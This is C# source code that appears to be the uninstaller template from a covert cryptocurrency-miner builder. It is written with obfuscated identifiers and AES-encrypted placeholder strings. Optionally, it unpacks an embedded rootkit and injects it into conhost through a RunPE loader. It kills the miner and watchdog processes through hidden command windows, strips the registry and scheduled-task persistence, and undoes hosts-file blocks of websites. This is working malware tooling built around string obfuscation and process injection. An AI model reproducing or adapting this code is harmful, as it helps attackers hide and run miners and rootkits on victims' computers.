using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Management;
#if DefDebug
using System.Windows.Forms;
#endif

public partial class _rUninstaller_
{
    public static string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
    public static string _rbD2_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#WATCHDOGPATH"));


    public static void Main()
    {
#if DefRootkit
        try
        {
            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RESRKU"))))
            {
                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                {
                    if (_rentry_.FullName.Contains("st"))
                    {
                        using (var _rstreamdata_ = _rentry_.Open())
                        {
                            using (var _rms_ = new MemoryStream())
                            {
                                _rstreamdata_.CopyTo(_rms_);
                                _rRun_(_rms_.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_("#CONHOST")), null);
                            }
                        }
                    }
                }
            }  
        }
        catch(Exception ex){
#if DefDebug
        MessageBox.Show("RK: " + ex.ToString());
#endif
        }
#endif

#if DefInstall
        try
        {
            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOGNAME")))
            {
                proc.Kill();
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U1: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            _rCommand_(_rGetString_("#SCMD"), _rGetString_("#REGREM"));

        }
        catch {}

        try
        {
            _rCommand_(_rGetString_("#SCMD"), _rGetString_("#TASKSCHREM"));
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U3: " + Environment.NewLine + ex.ToString());
#endif
        }

#endif

        try
        {
            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["CommandLine"] != null && (MemObj["CommandLine"].ToString().Contains(_rGetString_("#MINERID")) || MemObj["CommandLine"].ToString().Contains(_rGetString_("#WATCHDOGID"))))
                {
                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U4: " + Environment.NewLine + ex.ToString());
#endif
        }

        Thread.Sleep(3000);
        try
        {
            Directory.Delete(_rbD_, true);
            Directory.Delete(_rbD2_, true);
#if DefInstall
            File.Delete(PayloadPath);
#endif
        }
        catch { }

#if DefBlockWebsites
        try
        {
            string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), _rGetString_("#HOSTSPATH"));
            List<string> _rhostscontent_ = new List<string>(File.ReadAllLines(_rhostspath_));

            string[] _rdomainset_ = new string[] { DOMAINSET };
            for (int i = _rhostscontent_.Count - 1; i >= 0; i--)
            {
                foreach (string _set_ in _rdomainset_)
                {
                    if (_rhostscontent_[i].Contains(" " + _set_))
                    {
                        _rhostscontent_.RemoveAt(i);
                        break;
                    }
                }
            }
            File.WriteAllLines(_rhostspath_, _rhostscontent_.ToArray());
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif
        Environment.Exit(0);
    }

    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }

    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
    {
        var _rarg3_ = Encoding.ASCII.GetBytes("#IV");
        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), _rarg3_) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), _rarg3_);
        using (var _rarg7_ = new MemoryStream())
        {
            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
            {
                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
                _rarg8_.Close();
            }

            return _rarg7_.ToArray();
        }
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

#if DefRootkit
    public static byte[] _rGetTheResource_(string _rarg1_)
    {
        var MyResource = new System.Resources.ResourceManager("#RESPARENT", Assembly.GetExecutingAssembly());
        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
    }
    
    public static void _rRun_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_)
    {
        Assembly.Load(_rGetTheResource_("#RESRPE")).GetType(_rGetString_("#RUNPETYPE")).GetMethod(_rGetString_("#RUNPEMETHOD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
    }
#endif
}